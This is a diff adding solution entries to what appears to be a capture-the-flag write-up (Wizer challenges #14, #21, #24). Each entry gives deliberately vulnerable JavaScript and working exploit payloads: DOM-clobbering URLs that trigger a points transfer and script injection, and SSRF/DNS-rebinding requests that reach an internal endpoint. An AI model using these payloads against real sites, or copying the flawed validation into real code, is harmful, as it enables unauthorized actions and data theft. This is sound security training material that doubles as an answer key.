@@ -759,13 +759,95 @@ POST /getCompanyLogo
 
 
 
-<br /><br />
+<br />
+
+<br />
+
+### **#14: Points Management**
+
+**Goal:** Assume your balance is sufficient, make the app transfer 100 points to account# 8AAB24BF80DE40D584E6608452AB48F9
+
+**Code:**
+
+```javascript
+import styles from '../styles/Inner.module.css'
+import { useRouter } from 'next/router';
+import React from 'react';
+import $ from 'jquery';
+import Image from 'next/image';
+import DOMPurify from 'dompurify';
+
+export default function Home() {
+    const router = useRouter();
+    const { yourName, yourAvatar, transferTo, pointsToTransfer } = router.query;
+    const isNameProvided = typeof yourName === 'string' && yourName.length > 0; 
+    React.useEffect(() => {
+      if (router.isReady && isNameProvided) {
+        // Sanitize your-name and avatar image
+        const name = DOMPurify.sanitize(String(yourName));
+        const avatar = yourAvatar ? DOMPurify.sanitize(String(yourAvatar)) : '<img src="/favicon.png" width="20px">';
+        document.getElementById('name').innerText = name;
+        document.getElementById('avatar').innerHTML = avatar;
+        if(window.transferBalance && transferTo && pointsToTransfer) {
+          var formData = JSON.stringify($(router.query).serializeArray());
+          const response = $.ajax({type: "POST", url: "../api/transferPoints", async: false,
+                                   data: formData, success: function(){}, dataType: "json",
+                                   contentType : "application/json"})
+          if(response.status === 200) { alert(`${name}, you've successfully transfered ${pointsToTransfer}` + 
+                                              ` points to account ID ${transferTo}`); } 
+          else { $("#error").text(decodeURIComponent(response.responseText));}
+        }
+      }
+    }, [router.isReady, isNameProvided]);
+
+  return (
+      <main className="text-center mt-5">
+        <h6>
+          <span id="avatar"></span>&nbsp;&nbsp;
+          <span>Hello </span><span id="name"></span><span id="name">, what would you want to do next?</span>
+        </h6>
+        <h3 className="h3 mb-3 fw-normal">Points management</h3>
+        <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}} 
+            onClick={() => { router.push("/transfer")}}>Transfer Points</h5>
+        <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}} 
+            onClick={() => { router.push("/buy")}}>Buy points</h5>
+        <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}} 
+            onClick={() => { router.push("/trends")}}>Points spending trends</h5>
+        <div className={styles.footer}>
+          Powered by <Image src="/wizer.svg" 
+                            alt="Wizer" 
+                            width={200} 
+                            height={100} 
+                            className={styles.logo} />
+        </div>
+      </main>
+  )
+}
+```
+
+<br />
+
+DOM Clobbering: DOM Clobbering vulnerability since `window` global variables can be substituted with global DOM elements.
+
+The action is protected by a window variable called `transferBalance`, and only if this variable is set to true, a transfer action can be executed. Note that the page also accepts `yourName` and `yourAvatar` variables which are used to display the user's name and avatar in the page.
+
+```
+https://chal14.vercel.app/?yourName=Karim&yourAvatar=<h1>test</h1><a id=transferBalance>&transferTo=8AAB24BF80DE40D584E6608452AB48F9&pointsToTransfer=100
+```
+
+
+
+
+
+<br />
+
+<br />
 
 ### **#15: Login Here**
 
 **Goal:** Via API, login as the admin user Gabriel Tensey (UI: https://chal15.vercel.app/)
 
-
+**Code:**
 
 ```javascript
 import dotenv from 'dotenv';
@@ -1437,6 +1519,32 @@ The code below demonstrates a simple app menu that integrates values from a URL,
 
 There are three issues with the code: (1) it enables debugMode using a global window argument which could be potentially shadowed by DOM Clobbering techniques, and (2) debugMode skips sanitization upon printing key/value, hence assuming you can activate this mode, you're able to print out HTML code including malicious scripts, and (3) An HTML injection is present when not in debug mode (Root cause of the DOM clobbering)
 
+<br />
+
+```
+https://chal21-jknvdf2.vercel.app/dashboard.html?<div id="debugMode">=any&123=<script>alert("Wizer")</script>
+```
+
+**Note:** When submitting the flag, make sure to URL-encode it. If you submit it as-is, the key will be interpreted as `<div id`, and the value as `"debugMode>=any"`, which prevents the DOM clobbering from taking effect.
+
+<br />
+
+![](./assets/6.png)
+
+
+
+<br />
+
+![](./assets/7.png)
+
+
+
+<br />
+
+```
+https://chal21-jknvdf2.vercel.app/dashboard.html?%3Cdiv%20id%3D%22debugMode%22%3E=any&123=%3Cscript%3Ealert(%22Wizer%22)%3C/script%3E
+```
+
 
 
 <br /><br />
@@ -1628,6 +1736,131 @@ console.log("requestType: ", requestType);
 const data = request.substring(dataIndex + 5).substring(0, request.substring(dataIndex + 5).indexOf(","));
 console.log("data: ", data);
 ```
+
+<br /><br />
+
+### **#24: Company Logos Phase 2**
+
+**Goal: **Get the list of CRM users from the internal network API
+
+**Code:**
+
+```javascript
+import express from 'express';
+const app = express();
+const app2 = express();
+import fs from 'fs';
+import fetch from "node-fetch";
+import bodyParser from 'body-parser';
+app.use(bodyParser.json());
+import dotenv from 'dotenv';
+import { CRMUsers } from './crm.mjs';
+dotenv.config();
+
+const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
+
+app.post('/getCompanyLogo', async (req, res) => {
+    try {
+        let json = req.body;
+        let companyId = String(json.companyId);
+
+        if(companyId != '' && companyId.match(uuidFormat)) {
+            const data = fs.readFileSync(`${process.env.companyLogosFolder}/${companyId}`);
+            res.send(data);
+        }
+        else res.send("invalid arguments provided");
+    } catch (e) {
+        res.send(e.message);
+    }
+})
+
+const validURL = (ImageURL) => {
+    try {
+        const newUrl = new URL(ImageURL);
+        const validServer =!(newUrl.hostname.includes('localhost')) && 
+                           !(newUrl.hostname.startsWith('127')) &&
+                           !(newUrl.hostname.startsWith('0'));
+        return validServer && (newUrl.protocol === 'http:' || newUrl.protocol === 'https:');
+    } catch (err) { return false; }
+}
+
+app.post('/setCompanyLogo', async (req, res) => {
+    try {
+        console.log("remote ip:" + requestIp.getClientIp(req));
+        let json = req.body;
+        let companyId = String(json.companyId);
+        let imageUrl = validURL(json.imageUrl) ? json.imageUrl : '';
+
+        if(companyId != '' && companyId.match(uuidFormat)) {
+            const result = await fetch(imageUrl);
+            fs.writeFileSync(`${process.env.companyLogosFolder}/${companyId}`, await result.text());
+            res.sendStatus(200);
+        }
+        else res.send("invalid arguments provided");
+    } catch (e) {
+        res.send(e.message);
+    }
+})
+
+app2.get('/CRMUsers', async (req, res) => {
+    res.send(CRMUsers);
+})
+
+app.listen(process.env.port, () => {
+    console.log(`API listening on PORT ${process.env.port}`)
+})
+
+// Internal service; accessible only from localhost on port 4001
+app2.listen(4001, 'localhost', function() {
+    console.log("Internal service started port %d in %s mode", 4001, app2.settings.env);
+});
+```
+
+
+
+DNS Rebind attack:
+
+An attacker who knows about the internal service and identifies the validation made, could use a DNS Rebind approach to exploit the SSRF vulnerability. Once they discover the `/CRMUsers` endpoint, they can then use a domain name which resolves as localhost cush as `spoofed.burpcollaborator.net`, hence store an "imageUrl": "http://[domain]/CRMUsers" using the `/setCompanyLogo` endpoint, which could then be executed upon invoking the `/getCompanyLogo` of the specific company ID stored.
+
+<br />
+
+![](./assets/8.png)
+
+
+
+<br />
+
+![](./assets/9.png)
+
+<br />
+
+```
+POST /setCompanyLogo
+
+{
+  "companyId": "550e8400-e29b-41d4-a716-446655440001",
+  "imageUrl": "http://x.fbi.com:4001/CRMUsers"
+}
+
+OR
+
+{
+  "companyId": "550e8400-e29b-41d4-a716-446655440001",
+  "imageUrl": "http://spoofed.burpcollaborator.net:4001/CRMUsers"
+}
+```
+
+<br />
+
+```
+POST /getCompanyLogo
+
+{
+  "companyId": "550e8400-e29b-41d4-a716-446655440001"
+}
+```
+
+
 
 <br /><br />
 
